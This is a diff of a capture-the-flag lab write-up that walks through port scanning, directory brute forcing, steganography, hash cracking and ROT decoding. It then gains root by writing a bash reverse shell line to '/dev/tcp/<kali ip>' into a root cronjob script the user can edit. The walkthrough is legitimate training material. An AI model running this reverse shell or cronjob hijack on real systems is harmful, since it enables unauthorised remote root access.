@@ -1,5 +1,9 @@
 # recon
-nmap show us that there are 3 open port:
+Like always, start with nmap. I use my own tool to automate nmap scan, check it out [pymap](https://github.com/gu2rks/pymap)
+```console
+$ python3 pymap.py -t $IP --all
+```
+There are 3 open ports:
 - 80 ngnix server
 - 6498 ssh
 - 65524 apache server
@@ -14,7 +18,7 @@ here is what I found:
   - /w______
 - /index.html (Status: 200)
 - /robots.txt (Status: 200)
-The first flag is in one of the directory. Note that the flag is encoded. encode it and summit ur flag.
+The first flag is in one of the directory. Note that the flag is encoded. decode it and summit ur flag.
 ## port 65524 apache
 Same as port 80, use `gobuster` for directory brute forcing. In the meantime I was waiting for result from go buster. I looks around and find the 3rd flag. here is what I found with gobuster.
 - /index.html (Status: 200)
@@ -39,6 +43,7 @@ at this moment:
 - stegcracker is running
 - my laptop is screaming and burning...
 
+
 back to `/n0th1__________`, this a some werid strings there too. THM give us a HINT that the string is a GOST Hash. use ur favorite search engines and find online hash cracking website. Boom! I got a password!!. 
 
 **hint**: <details>I used this [site](https://md5hashing.net/hash/gost/)) to crack it</details>
@@ -54,8 +59,8 @@ At this point, we still missing flag 2. Base on what we found, the string that w
 
 
 The solution was to find online hash cracking website. to gain 2nd flag. 
-**hint:** 
-<details> same site as GOST hash cracker.</details>
+
+**hint:** <details> same site as GOST hash cracker.</details>
 
 Back to the file we extracted from steghide
 ```console
@@ -75,13 +80,13 @@ User Flag But It Seems Wrong Like It`s Rotated Or Something
 <flaghere>
 ```
 The hint said *User Flag But It Seems Wrong Like It`s Rotated Or Something*.... **Rotated**... Find out what it mean:
-**hint:**
-<details>ROT cipher</details>
+
+**hint:** <details>ROT cipher</details>
 
 # root
 I tried to `sudo -l` but we dont have premission to do so. then I remember that it said in the room detail that *escalate your privileges through a vulnerable cronjob.* so lets do it!
 ```console
-boring@kral4-PC:~$ cat /etc/crontab 
+boring@kral4-PC:~$ cat /etc/crontab # check crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -101,7 +106,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 if you do not know what cronjob is, pls look it up. In short each 1 min a hidden bash script call `.mysecretcronjob.sh` is executed by root. the script is located at `/var/www/`. lucky the script is own by our current user which mean we have a permission to read and write the script.
 
-The plan is modify the script to a reverse shell to gain root access. add this to the script
+The plan is modify the script (`.mysecretcronjob.sh`) to a reverse shell to gain root access. add this to the script
 ```sh
 bash -i >& /dev/tcp/<kali ip>/6969 0>&1
 ```
@@ -115,5 +120,6 @@ bash: no job control in this shell
 root@kral4-PC:/var/www#
 ```
 now go grab root flag
-**Hint**
-<details>hidden...</details>
+
+**Hint**:
+<details>hidden hidden hidden...</details>
